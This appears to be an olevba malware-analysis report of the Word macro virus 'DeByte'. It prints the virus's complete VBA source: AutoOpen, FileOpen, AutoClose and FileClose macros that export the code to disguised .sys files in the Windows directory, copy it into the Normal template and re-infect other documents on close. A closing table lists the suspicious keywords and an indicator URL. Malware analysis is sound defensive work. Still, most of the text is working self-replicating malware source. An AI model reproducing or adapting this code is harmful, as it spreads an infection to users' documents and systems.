olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.DeByte
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Dead_Byte.bas 
in file: Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/Dead_Byte'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Dead_Byte()
   'http://www.deadbyte.narod.ru
   
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub FileOpen()
Dim winda As String
Dim test_normal As Byte
Dim t As Byte

t = 0
Dialogs(wdDialogFileOpen).Show
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then t = 255
Next

If t = 0 Then GoTo ok

test_normal = 0
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)

ActiveDocument.VBProject.VBComponents("Dead_Byte").Export winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents("FileOpen").Export winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents("AutoOpen").Export winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents("AutoClose").Export winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents("FileClose").Export winda + "\wdrv5.sys"

For i = 1 To WordBasic.CountMacros(0, 0)
 If WordBasic.[MacroName$](i, 0, 0) = "Dead_Byte" Then test_normal = 255
Next i

If test_normal = 255 Then GoTo ok
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Dead_Byte", "Normal:Dead_Byte"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Normal:FileOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "Normal:FileClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Normal:AutoClose"
ok:
End Sub

-------------------------------------------------------------------------------
VBA MACRO Autoopen.bas 
in file: Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Sub Autoopen()
Dim winda As String
Dim test_normal As Byte

test_normal = 0
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)

ActiveDocument.VBProject.VBComponents("Dead_Byte").Export winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents("FileOpen").Export winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents("Autoopen").Export winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents("AutoClose").Export winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents("FileClose").Export winda + "\wdrv5.sys"

For i = 1 To WordBasic.CountMacros(0, 0)
 If WordBasic.[MacroName$](i, 0, 0) = "Dead_Byte" Then test_normal = 255
Next i

If test_normal = 255 Then GoTo ok
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Dead_Byte", "Normal:Dead_Byte"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Normal:FileOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Fileclose", "Normal:FileClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Autoclose", "Normal:AutoClose"
ok:
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub AutoClose()
Dim vir_test As Byte
Dim winda As String

vir_test = 0
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok

winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv5.sys"
ActiveDocument.Save
V_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/Fileclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub FileClose()
Dim vir_test As Byte
Dim winda As String

vir_test = 0
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok

winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv5.sys"
ActiveDocument.Save
V_ok:
WordBasic.FileClose
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.deadbyte.|URL                                          |
|          |narod.ru            |                                             |
+----------+--------------------+---------------------------------------------+

